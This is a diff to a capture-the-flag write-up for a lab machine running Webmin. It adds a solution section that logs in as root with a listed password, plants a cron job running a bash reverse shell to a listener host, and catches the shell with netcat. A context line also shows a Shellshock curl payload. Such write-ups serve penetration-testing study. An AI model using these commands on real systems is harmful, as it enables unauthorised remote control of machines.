@@ -173,6 +173,19 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + Get root shell:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
 
+### 3.Solution:
++ Navigate to `https://10.10.10.7:10000/` and login webmin: `root`:`jEhdIekWmdjE`
++ Go to `System`->`Scheduled Cron Jobs`->`Create a new scheduled cron job.`
++ `bash -c 'bash -i >& /dev/tcp/10.10.14.18/5555 0>&1'`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/414e50d8-13c0-4265-9709-885ffc6103f9)
+
++ Start listener: `nc -lnvp 5555`
++ Run Now:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d084c449-d3b1-4446-90ce-96bb920ddd44)
+
++ Get root shell:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/819decc1-3fb6-4d95-8915-6df5306f1a9f)
+
 
 
 # References & Alternatives:
